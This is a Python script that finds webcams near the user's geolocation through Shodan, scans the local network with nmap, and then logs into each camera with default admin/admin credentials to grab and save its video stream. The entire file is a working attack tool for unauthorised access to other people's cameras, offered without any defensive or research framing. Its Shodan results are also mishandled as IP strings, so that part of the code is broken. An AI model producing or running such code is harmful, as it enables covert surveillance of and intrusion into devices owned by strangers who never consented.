import requests
import shodan
import geocoder
import os
import nmap
import threading
import time

def get_location():
    try:
        return geocoder.ip('me').latlng
    except Exception as e:
        print(f'Error getting location: {e}')
        return None

def shodan_camera_search(lat, lon, radius=50):
    SHODAN_API_KEY = 'YOUR_SHODAN_API_KEY'
    api = shodan.Shodan(SHODAN_API_KEY)
    query = f'server: SQ-WEBCAM geo:{lat},{lon},{radius}'
    
    try:
        results = api.search(query)
        return results['matches']
    except shodan.APIError as e:
        print(f'Error with Shodan API: {e}')
        return []
    except Exception as e:
        print(f'Error searching Shodan: {e}')
        return []

def nmap_camera_search(network):
    nm = nmap.PortScanner()
    
    try:
        nm.scan(hosts=network, arguments='-p80,8080')
        
        cameras = []
        for host in nm.all_hosts():
            if nm[host].state() == 'up':
                cameras.append(host)
        return cameras
    except Exception as e:
        print(f'Error with Nmap scan: {e}')
        return []

def exploit_camera(camera_ip, username='admin', password='admin'):
    login_url = f'http://{camera_ip}/login.cgi'
    stream_url = f'http://{camera_ip}/videostream.cgi'
    
    try:
        session = requests.Session()
        session.verify = False
        
        session.post(login_url, data={'user': username, 'pwd': password}, timeout=5)
        response = session.get(stream_url, timeout=5)
        
        if response.status_code == 200:
            print(f'Exploit successful for camera {camera_ip}')
            return response.content
        else:
            print(f'Failed to exploit camera {camera_ip}')
            return None
    except Exception as e:
        print(f'Error exploiting camera {camera_ip}: {e}')
        return None

def save_camera_feed(camera_ip, feed_data):
    try:
        filename = f'{camera_ip}_feed.jpg'
        with open(filename, 'wb') as file:
            file.write(feed_data)
        print(f'Camera feed saved as {filename}')
    except Exception as e:
        print(f'Error saving camera feed for {camera_ip}: {e}')

def threaded_camera_exploit(camera):
    feed_data = exploit_camera(camera)
    if feed_data:
        save_camera_feed(camera, feed_data)

location = get_location()

if location:
    lat, lon = location
    print(f'Current location: {lat}, {lon}')
    
    shodan_cameras = shodan_camera_search(lat, lon)
    network_cameras = nmap_camera_search('192.168.0.0/24')
    
    cameras = shodan_cameras + network_cameras
    print(f'Found {len(cameras)} cameras nearby')

    for camera in cameras:
        t = threading.Thread(target=threaded_camera_exploit, args=(camera,))
        t.start()
        time.sleep(0.1)  # Add a small delay between thread starts
else:
    print('Failed to get current location')
